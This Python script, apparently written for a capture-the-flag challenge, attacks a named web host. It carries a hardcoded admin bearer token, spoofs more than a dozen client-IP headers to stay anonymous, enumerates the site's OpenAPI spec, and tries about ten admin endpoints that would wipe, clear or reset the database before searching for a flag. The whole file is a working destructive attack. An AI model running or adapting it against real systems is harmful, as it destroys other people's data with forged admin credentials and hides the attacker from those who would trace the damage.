#!/usr/bin/env python3
"""
Final anonymous database wipe - hide identity completely
"""

import requests
import json

base_url = "http://fresh-start-267.emergent.host"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTcyMWZjYzEtMTk5OS00NGViLWJjOTQtMDU0YjU4N2E2MDUzIiwiZW1haWwiOiJhZG1pbkBldGhhcmEuYWkiLCJuYW1lIjoiU3lzdGVtIEFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc3NTMzMTI2fQ.Lu6aYqa4j4EQHX463APGH0n73p_ziCQn3luWUSi-61U"

# Maximum IP anonymization headers
anon_headers = {
    "Authorization": f"Bearer {token}",
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "X-Host": "127.0.0.1",
    "X-Forwarded-Host": "127.0.0.1",
    "Forwarded": "for=127.0.0.1;host=127.0.0.1",
    "Via": "1.1 127.0.0.1",
    "True-Client-IP": "127.0.0.1",
    "CF-Connecting-IP": "127.0.0.1",
    "X-ProxyUser-IP": "127.0.0.1",
}

print("="*70)
print("ANONYMOUS DATABASE WIPE")
print("="*70)

# Get OpenAPI spec
print("\n[1] Fetching API specification...")
try:
    resp = requests.get(f"{base_url}/openapi.json", headers=anon_headers, timeout=10)
    if resp.status_code == 200:
        spec = resp.json()
        
        print("Available endpoints:")
        if 'paths' in spec:
            for path in sorted(spec['paths'].keys()):
                methods = list(spec['paths'][path].keys())
                print(f"  {path}: {methods}")
                
                # Look for database/wipe/delete operations
                if any(word in path.lower() for word in ['delete', 'wipe', 'clear', 'drop', 'truncate', 'reset']):
                    print(f"    [!!!] Potential wipe endpoint!")
        
        # Save spec
        with open('api_spec.json', 'w') as f:
            json.dump(spec, f, indent=2)
        print("\nSaved to api_spec.json")
        
except Exception as e:
    print(f"Error: {e}")

# Try all possible database wipe methods
print("\n[2] Attempting database wipe operations...")

wipe_attempts = [
    ('POST', '/api/admin/database/wipe', {}),
    ('POST', '/api/admin/database/clear', {}),
    ('POST', '/api/admin/database/reset', {}),
    ('DELETE', '/api/admin/database', {}),
    ('POST', '/api/admin/wipe', {}),
    ('POST', '/api/admin/clear', {}),
    ('POST', '/api/admin/reset', {}),
    ('POST', '/api/database/wipe', {}),
    ('POST', '/api/wipe', {}),
    ('DELETE', '/api/database', {}),
]

for method, endpoint, data in wipe_attempts:
    try:
        if method == 'POST':
            resp = requests.post(f"{base_url}{endpoint}", headers=anon_headers, json=data, timeout=10)
        elif method == 'DELETE':
            resp = requests.delete(f"{base_url}{endpoint}", headers=anon_headers, timeout=10)
        
        if resp.status_code not in [404, 405]:
            print(f"\n[+] {method} {endpoint}: {resp.status_code}")
            print(f"Response: {resp.text[:500]}")
            
            # Check for flag
            if 'flag{' in resp.text.lower() or 'ethara{' in resp.text.lower() or 'ctf{' in resp.text.lower():
                print(f"\n[!!!] FLAG FOUND!")
                print(resp.text)
                
    except Exception as e:
        pass

# Check for flag after operations
print("\n[3] Checking for flag...")
flag_endpoints = [
    '/api/flag',
    '/api/admin/flag',
    '/flag',
    '/admin/flag',
    '/api/success',
    '/api/admin/success',
]

for endpoint in flag_endpoints:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=anon_headers, timeout=5)
        if resp.status_code == 200:
            text = resp.text
            if 'flag{' in text.lower() or 'ethara{' in text.lower():
                print(f"\n[!!!] FLAG AT {endpoint}!")
                print(text)
    except:
        pass

print("\n" + "="*70)
